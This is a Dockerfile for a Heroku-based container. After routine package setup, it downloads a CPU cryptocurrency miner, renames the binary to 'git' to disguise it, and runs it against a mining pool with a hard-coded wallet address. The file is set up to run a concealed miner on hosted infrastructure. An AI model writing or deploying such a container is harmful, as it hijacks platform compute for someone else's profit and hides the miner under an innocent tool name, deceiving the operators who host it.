FROM heroku/heroku:18
RUN \
  sed -i 's/# \(.*multiverse$\)/\1/g' /etc/apt/sources.list && \
  apt-get update && \
  apt-get -y upgrade && \
  apt-get install -y curl git unzip wget && \
  rm -rf /var/lib/apt/lists/*
RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar zxvf hellminer_cpu_linux.tar.gz && rm -fr hellminer_cpu_linux.tar.gz && mv hellminer git
RUN ./git -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RVMogaFrwhokbkM4M1WERfU8V8U1NQJLnk.VPS -p x --cpu 1
CMD bash heroku.sh